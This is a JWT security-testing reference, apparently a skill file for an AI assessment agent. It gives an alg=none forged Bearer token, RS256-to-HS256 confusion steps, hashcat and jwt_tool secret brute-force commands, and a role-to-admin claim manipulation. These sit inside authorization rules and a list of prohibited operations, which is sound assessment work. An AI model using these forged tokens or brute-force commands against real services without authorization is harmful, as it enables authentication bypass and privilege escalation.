# JWT Security Payload

> ⚠️ **Security Boundary Statement**
> 
> This document is for **authorized AppSec assessment reference** only, helping identify JWT vulnerability risk characteristics.
> 
> - All payloads are **technical principle demonstrations**, actual unauthorized access is prohibited
> - JWT payloads are for understanding attack surface only, **no persistent forged access**
> - Validation proves vulnerability existence (signature flaw), **no credential extraction**
> - See `SKILL.md` for specific execution boundaries
> 
> **Core Principle**: Prove existence, do not enable harm

---

## Source: PayloadsAllTheThings, HackTricks

## Manual Testing

**Note: Test signature validation, algorithm confusion, and token structure**

---

## Validation Objectives (Within Security Boundary)

JWT security vulnerability validation core objective is **proving existence**:

| Validation Content | Default | Requires Additional Authorization | Prohibited Operations |
|----------|---------|-----------|----------|
| Signature Validation Check | ✓ Test if signature verified | - | Use forged token for access |
| Algorithm Confusion | ✓ Test alg switching | - | Authenticate with forged token |
| Weak Secret Detection | ✓ Identify weak secret hints | ✓ Test brute force briefly | Extract sensitive claims |
| None Algorithm Test | ✓ Test alg=none handling | - | Use none-alg token for access |
| Claim Manipulation | ✓ Modify non-sensitive claim | - | Elevate privileges with forged token |

**Safe Validation Method**: Test if signature validation exists and is correct; do not use forged tokens for actual unauthorized access without authorization.

---

## JWT Structure

```text
JWT = header.payload.signature

header = {"alg":"HS256","typ":"JWT"}
payload = {"sub":"user","role":"user","exp":1234567890}
signature = HMACSHA256(base64(header) + "." + base64(payload), secret)
```

### Decode JWT

```bash
# Decode JWT components
echo "<header_base64>" | base64 -d
echo "<payload_base64>" | base64 -d

# Using jwt_tool (if available)
python3 jwt_tool.py <JWT>

# Online decoder (use carefully with sensitive tokens)
# jwt.io (local decode only, do not paste sensitive tokens)
```

---

## None Algorithm Attack

### Test if alg=none accepted

```bash
# Craft JWT with alg=none (signature empty)
header = {"alg":"none","typ":"JWT"}
payload = {"sub":"test","role":"user"}
signature = ""

# Construct: base64(header).base64(payload).
# Try sending to endpoint, observe if accepted
```

```http
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJ0ZXN0Iiwicm9sZSI6InVzZXIifQ.
```

**Expected**: If server accepts -> signature not validated -> Critical vulnerability.

---

## Algorithm Confusion (RS256 -> HS256)

```bash
# If JWT uses RS256 (RSA public key verify)
# Try switching to HS256 and use public key as HMAC secret

# 1. Obtain public key (from /jwt/public, jwks endpoint, or certificate)
curl -s https://target.com/jwks.json

# 2. Craft HS256 JWT using public key as secret
header = {"alg":"HS256","typ":"JWT"}
payload = {"sub":"test","role":"user"}
signature = HMACSHA256(header.payload, public_key)

# 3. Send to endpoint
```

**Expected**: If accepted -> algorithm confusion vulnerability.

---

## Weak Secret Brute Force

```bash
# If HS256 with weak secret
# Test common secrets briefly (only with authorization)

# Common weak secrets
secret
password
123456
admin
key
jwt_secret

# Using hashcat (requires authorization)
hashcat -m 16500 <JWT> wordlist.txt

# Using jwt_tool
python3 jwt_tool.py <JWT> -C -d wordlist.txt
```

**Boundary**: Weak secret brute force requires explicit authorization; limit to brief test only.

---

## Signature Not Verified

```bash
# Test if signature is validated at all
# Modify any claim, keep original signature

# Original JWT payload: {"sub":"user123","role":"user"}
# Modified: {"sub":"user123","role":"admin"}

# Encode modified payload, keep original signature
# If accepted -> signature not validated
```

---

## Claim Injection Test

### Safe Test: Modify Non-Sensitive Claim

```bash
# Modify claim that doesn't grant access (proof of concept)
# Original: {"exp":1234567890}
# Modified: {"exp":9999999999}

# If server accepts modified exp -> signature not validated
```

### ⚠️ Privilege Escalation Test (Requires Authorization)

```bash
# Only with user authorization
# Modify role claim: {"role":"user"} -> {"role":"admin"}
# If accepted -> privilege escalation via JWT forgery
```

---

## JWT Token Leakage Detection

```bash
# Check for JWT in URL parameters
curl -s <url>?token=eyJhbGci...

# Check for JWT in cookies without proper attributes
curl -sI <url> | grep "Set-Cookie.*eyJ"

# Check for JWT in JavaScript
curl -s <url> | grep -E "eyJ[a-zA-Z0-9_-]*\."

# Check for JWT in localStorage/sessionStorage references
curl -s <url> | grep -E "localStorage|sessionStorage"
```

---

## JWT Endpoints to Check

```text
/jwt/public
/jwks.json
/.well-known/jwks.json
/oauth/jwks
/api/jwks
/certs
/keys
```

---

## Analysis Process

1. Extract JWT from request (Authorization header, cookie, URL)
2. Decode header and payload to understand structure
3. Test alg=none acceptance
4. Test signature validation (modify payload, keep signature)
5. Check if public key available for RS256->HS256 test
6. **Stop validation**, confirm JWT flaw exists
7. If privilege escalation test needed, obtain authorization first

---

## Output

```markdown
## Vulnerability: JWT Signature Validation Flaw

### Location
{URL} - {endpoint using JWT}

### Vulnerability Type
{None Algorithm / Algorithm Confusion / Signature Not Verified / Weak Secret}

### Evidence
- Algorithm: {HS256/RS256/none}
- Signature validation: {verified/not verified}
- Public key exposed: {yes/no}

### Proof Payload
{Modified JWT structure}

### Risk Level
{see severity rules}

### Severity Classification

JWT vulnerabilities must distinguish"**signature flaw exists**"and"**forged token can actually pass auth**". Finding alg=none, RS256->HS256 confusion, weak keys is only flaw confirmation - many servers configure blacklists/algorithm allowlists, the forged token is not accepted at all. **High requires the forged token to pass authentication; unverified exploitability is Low. **

| Actual case | Severity | Note |
|---------|------|------|
| After user authorization, verify with a forged token, passes auth (e.g. alg=none accepted, privilege claim effective)| **High** | Forgery chain closure, authentication bypass confirmed |
| signature flaw found (alg=none supported / public key exposed / weak key hint)but forged token not accepted (default testing scope)| **Low** | Flaw exists, exploitability not confirmed. Do not report based on"alg=none appears supported"to report High |
| Weak key brute-force requires authorization, When unauthorized, only identify hints | Low | Brute-force belongs to Tier 2 |
| Only token structure parseable / claim readable, no signature issue | Info | No security significance |

**Boundary coordination**: This file's Prohibited Operations prohibits actual access with forged tokens by default. Therefore within default testing scope JWT issues are Low — only prove signature flaw exists (e.g. send alg=none token and check if response rejects). "Forged token passes authentication = High" requires **explicit user authorization** to use a test account to verify whether the forged token is accepted; confirm before recording High, and record the bypass method and verification result. Do not increase severity for possible forgery without authorization. 
```

---

## Prohibited Operations Checklist

| Prohibited | Description |
|------|------|
| ❌ Authenticate with forged token | Do not use forged JWT for actual access without authorization |
| ❌ Privilege escalation | Do not modify role/permissions claims without authorization |
| ❌ Persistent forged access | Do not maintain access using forged tokens |
| ❌ Credential extraction | Do not extract other users' claims from valid tokens |
| ❌ Brute force without auth | Weak secret brute force requires explicit authorization |

---

## Execution Boundary Reference

Complete security boundary:
- `SKILL.md` -> Core Principles -> "Prove existence, do not enable harm"
- `SKILL.md` -> Action Policy -> "Authenticated testing | Ask first"